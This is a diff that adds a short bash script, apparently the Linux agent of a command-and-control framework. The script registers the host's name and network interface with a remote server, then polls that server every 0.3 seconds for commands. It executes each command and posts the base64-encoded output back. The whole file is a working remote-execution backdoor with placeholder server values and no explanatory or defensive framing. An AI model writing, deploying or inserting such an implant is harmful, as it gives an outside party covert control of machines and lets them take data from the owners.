@@ -1,0 +1,22 @@
+#!/bin/bash
+ip="REPLACE_IP"
+port="REPLACE_PORT"
+interface="REPLACE_INTERFACE"
+n=.3
+
+regl="http://$ip:$port/reg/"
+
+declare -A data=( [eth]=$interface [hname]=$(hostname) )
+
+name=$(curl -X POST -F eth=$interface -F hname=$(hostname) $regl) 
+
+taskl="http://$ip:$port/tasks/$name/"
+resultl="http://$ip:$port/Lin-results/$name/"
+
+while :
+do  
+   
+    echo $($(curl $taskl)|base64) > /tmp/result
+    curl -X POST --data "@/tmp/result" $resultl
+    sleep $n
+done
